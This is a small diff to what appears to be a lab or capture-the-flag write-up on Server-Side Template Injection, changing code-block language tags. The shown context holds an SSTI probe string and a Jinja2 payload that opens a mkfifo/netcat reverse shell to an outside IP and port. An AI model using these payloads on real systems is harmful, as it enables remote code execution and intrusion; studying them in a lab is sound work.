@@ -345,7 +345,7 @@ This is a huge red flag for Server-Side Template Injection (SSTI). The server is
 
 I used this payload:
 
-```json
+```text
 { "username": "${{<%[%'\"}}%\\." }
 ```
 
@@ -372,7 +372,7 @@ The traceback explicitly mentions `jinja2.exceptions.TemplateSyntaxError`. We've
 
 Now for the fun part: getting a reverse shell. We can craft a payload to execute OS commands.
 
-```json
+```text
 {
   "username": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.21.206.128 4444 >/tmp/f').read() }}"
 }
